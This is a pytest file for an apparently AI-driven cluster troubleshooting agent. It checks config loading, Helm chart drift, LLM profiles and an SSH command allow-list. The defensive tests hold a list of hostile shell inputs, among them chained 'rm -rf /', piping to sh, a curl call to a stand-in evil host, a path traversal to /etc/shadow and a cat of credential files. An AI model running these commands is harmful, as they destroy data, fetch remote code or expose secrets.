"""The shipped config must actually load, and the deployed copies must not drift.

A broken regex or a stale ConfigMap copy is the kind of thing that only shows up on the cluster
at 3am, so it is checked here instead.
"""

from __future__ import annotations

import re

import pytest
import yaml

from tests.conftest import CONFIG_DIR
from tsagent.config import AppConfig, ClusterInventory
from tsagent.llm import LLMGateway
from tsagent.runbooks import clear_cache, runbook_hints
from tsagent.tools.ssh import AllowList

CHART_DIR = CONFIG_DIR.parent / "deploy" / "helm" / "tsagent"


# -- shipped config loads ---------------------------------------------------


def test_clusters_yaml_loads():
    inventory = ClusterInventory.model_validate(
        yaml.safe_load((CONFIG_DIR / "clusters.yaml").read_text())
    )
    assert inventory.clusters
    for name in inventory.clusters:
        assert inventory.prometheus_for(name) is not None, f"{name} points at an unknown Prometheus"
        assert inventory.director_for(name) is not None


def test_llm_yaml_loads_and_every_referenced_profile_exists():
    gateway = LLMGateway(CONFIG_DIR / "llm.yaml")
    assert gateway.default_profile in gateway.profiles
    for agent, profile in gateway.per_agent_overrides.items():
        assert profile in gateway.profiles, f"agent {agent} points at undefined profile {profile}"
    for profile in gateway.fallback_chain:
        assert profile in gateway.profiles


@pytest.fixture
def shipped_config_dir(monkeypatch):
    """Point the settings singleton at the repo's config/ directory."""
    from tsagent.config import get_settings

    monkeypatch.setenv("TSAGENT_CONFIG_DIR", str(CONFIG_DIR))
    get_settings.cache_clear()
    clear_cache()
    yield CONFIG_DIR
    get_settings.cache_clear()
    clear_cache()


def test_settings_yaml_loads(shipped_config_dir):
    config = AppConfig()
    assert config.correlation.window_seconds > 0
    # The age cap must exceed the quiet window or groups would promote immediately.
    assert config.correlation.max_group_age_seconds > config.correlation.window_seconds
    assert config.reflection.max_retries >= 1


def test_env_var_overrides_settings_yaml(monkeypatch):
    monkeypatch.setenv("TSAGENT_CORRELATION__WINDOW_SECONDS", "42")
    assert AppConfig().correlation.window_seconds == 42


# -- allow-list integrity ---------------------------------------------------


def test_every_allowlist_pattern_compiles_and_is_anchored():
    raw = yaml.safe_load((CONFIG_DIR / "ssh_allowlist.yaml").read_text())
    patterns = (raw.get("director") or []) + (raw.get("overcloud") or [])
    assert patterns

    for entry in patterns:
        pattern = entry["pattern"]
        re.compile(pattern)  # raises on a malformed pattern
        assert pattern.startswith("^") and pattern.endswith("$"), (
            f"{pattern!r} is unanchored, so a longer command could match a prefix"
        )
        assert entry.get("description"), f"{pattern!r} has no description for the agent prompt"


def test_no_allowlist_pattern_contains_a_literal_shell_operator():
    """None of these are regex metacharacters we use, so a literal one is always a mistake."""
    allowlist = AllowList.load(CONFIG_DIR / "ssh_allowlist.yaml")
    for pattern, _ in allowlist.overcloud + allowlist.director:
        body = pattern.pattern.removeprefix("^").removesuffix("$")
        for dangerous in (";", "&", "`", ">", "<"):
            assert dangerous not in body, (
                f"pattern {pattern.pattern!r} could match a command containing {dangerous!r}"
            )


ADVERSARIAL = [
    "df -h; rm -rf /",
    "df -h && reboot",
    "df -h | sh",
    "uptime `reboot`",
    "uptime $(curl http://evil.example)",
    "sudo tail -n 10 /var/log/../../etc/shadow.log",
    "systemctl status nova && systemctl stop nova",
    "openstack server list; cat /home/stack/stackrc",
]


@pytest.mark.parametrize("command", ADVERSARIAL)
@pytest.mark.parametrize("scope", ["director", "overcloud"])
def test_adversarial_commands_match_nothing(command, scope):
    """The property that actually matters: no allow-listed pattern accepts a compound command."""
    allowlist = AllowList.load(CONFIG_DIR / "ssh_allowlist.yaml")
    patterns = allowlist.director if scope == "director" else allowlist.overcloud
    for pattern, _ in patterns:
        assert not pattern.fullmatch(command), (
            f"{pattern.pattern!r} matched adversarial command {command!r}"
        )


@pytest.mark.parametrize("scope", ["director", "overcloud"])
def test_allowlist_descriptions_render_for_the_prompt(scope):
    allowlist = AllowList.load(CONFIG_DIR / "ssh_allowlist.yaml")
    assert allowlist.describe(scope).strip()


# -- deployment copies ------------------------------------------------------


def test_chart_ships_the_same_allowlist_as_the_repo():
    """The chart's copy is what actually runs; drift here is a silent security regression."""
    source = (CONFIG_DIR / "ssh_allowlist.yaml").read_text()
    shipped = (CHART_DIR / "files" / "ssh_allowlist.yaml").read_text()
    assert source == shipped, (
        "deploy/helm/tsagent/files/ssh_allowlist.yaml is out of date; "
        "re-copy it from config/ssh_allowlist.yaml"
    )


def test_chart_ships_the_same_runbooks_as_the_repo():
    for source in (CONFIG_DIR / "runbooks").glob("*.yaml"):
        shipped = CHART_DIR / "files" / "runbooks" / source.name
        assert shipped.exists(), f"{source.name} is missing from the chart"
        assert source.read_text() == shipped.read_text()


def test_chart_values_reference_only_defined_llm_profiles():
    values = yaml.safe_load((CHART_DIR / "values.yaml").read_text())
    llm = values["llm"]
    assert llm["default_profile"] in llm["profiles"]
    for profile in llm.get("per_agent_overrides", {}).values():
        assert profile in llm["profiles"]


@pytest.mark.parametrize(
    "preset", ["values-vllm.yaml", "values-ollama.yaml", "values-public-llm.yaml"]
)
def test_value_presets_are_self_consistent(preset):
    values = yaml.safe_load((CHART_DIR / preset).read_text())
    llm = values["llm"]
    assert llm["default_profile"] in llm["profiles"]
    for profile in llm.get("fallback_chain") or []:
        assert profile in llm["profiles"], f"{preset} falls back to undefined profile {profile}"


# -- runbooks ---------------------------------------------------------------


def test_runbook_hints_are_found_for_shipped_alarms(shipped_config_dir):
    hints = runbook_hints(["NodeDown"])
    assert "node exporter" in hints.lower()
    assert "No runbook entry" in runbook_hints(["SomethingNobodyWroteDown"])


def test_global_runbook_hints_apply_even_without_an_alarm_match(shipped_config_dir):
    """Stack-level guidance (which exporter, where the host label is) is always relevant."""
    hints = runbook_hints(["SomethingNobodyWroteDown"])
    assert "No runbook entry" in hints
    assert "collectd" in hints, "the STF global block should still be appended"


def test_stf_runbook_covers_the_alarms_seen_in_the_lab(shipped_config_dir):
    hints = runbook_hints(["hugepages", "High Hugepage Usage"])
    assert "collectd_hugepages_vmpage_number" in hints
    assert "plugin_instance" in hints


@pytest.mark.parametrize(
    "source",
    ["values.yaml", "values-vllm.yaml", "values-ollama.yaml"],
)
def test_self_hosted_profiles_declare_a_structured_output_mode(source):
    """A self-hosted endpoint must say how it wants JSON asked for.

    vLLM implements response_format as guided decoding and some builds reject it outright, so
    leaving it implicit means the first real incident is where you find out.
    """
    values = yaml.safe_load((CHART_DIR / source).read_text())
    for name, profile in values["llm"]["profiles"].items():
        if profile.get("api_base"):
            assert profile.get("structured_output"), (
                f"{source}: profile {name!r} has an api_base but no structured_output"
            )


def test_shipped_llm_config_matches_the_chart_on_structured_output():
    repo = yaml.safe_load((CONFIG_DIR / "llm.yaml").read_text())["profiles"]
    chart = yaml.safe_load((CHART_DIR / "values.yaml").read_text())["llm"]["profiles"]
    for name, profile in chart.items():
        if name in repo:
            assert profile.get("structured_output") == repo[name].get("structured_output"), (
                f"profile {name!r} disagrees between config/llm.yaml and the chart"
            )


# -- promql scoping vs alarm matching ---------------------------------------


def test_promql_matchers_default_to_alarm_labels():
    """Backwards compatible: unset means the old behaviour."""
    inv = ClusterInventory.model_validate(
        {
            "prometheus_instances": {"p": {"url": "http://p:9090"}},
            "clusters": {"c1": {"prometheus": "p", "director": {"host": "d"},
                                "labels": {"site": "lab"}}},
        }
    )
    assert inv.label_matchers_for("c1") == {"site": "lab"}


def test_promql_matchers_can_be_emptied_independently_of_alarm_labels():
    """A single-Prometheus cluster needs no scoping, but still needs alarm labels to match.

    Injecting a label the metrics do not carry makes every query return empty, which reads as a
    healthy system — the failure mode seen in lab testing.
    """
    inv = ClusterInventory.model_validate(
        {
            "prometheus_instances": {"p": {"url": "http://p:9090"}},
            "clusters": {
                "c1": {
                    "prometheus": "p",
                    "director": {"host": "d"},
                    "labels": {"site": "lab"},
                    "promql_matchers": {},
                }
            },
        }
    )
    assert inv.resolve_cluster({"site": "lab"}) == "c1"  # alarm matching still works
    assert inv.label_matchers_for("c1") == {}  # but nothing is injected into queries


def test_promql_matchers_may_differ_from_alarm_labels():
    inv = ClusterInventory.model_validate(
        {
            "prometheus_instances": {"p": {"url": "http://p:9090"}},
            "clusters": {
                "c1": {
                    "prometheus": "p",
                    "director": {"host": "d"},
                    "labels": {"site": "lab"},
                    "promql_matchers": {"cloud": "cloud1"},
                }
            },
        }
    )
    assert inv.label_matchers_for("c1") == {"cloud": "cloud1"}


def test_chart_ships_the_same_promql_library_as_the_repo():
    """The chart's copy is what the deployed agent sees; drift means stale query examples."""
    source = (CONFIG_DIR / "promql_library.yaml").read_text()
    shipped = (CHART_DIR / "files" / "promql_library.yaml").read_text()
    assert source == shipped, (
        "deploy/helm/tsagent/files/promql_library.yaml is out of date; "
        "re-copy it from config/promql_library.yaml"
    )


def test_shipped_promql_library_is_valid():
    from tsagent.knowledge import PromQLLibrary
    from tsagent.tools.prometheus import metric_names_in

    library = PromQLLibrary.load(CONFIG_DIR / "promql_library.yaml")
    assert len(library) > 20
    for entry in library.entries:
        assert entry.promql.strip(), f"{entry.name} has empty promql"
        # Every entry must name at least one real metric, or it teaches the agent nothing.
        assert metric_names_in(entry.promql), f"{entry.name} selects no metric"
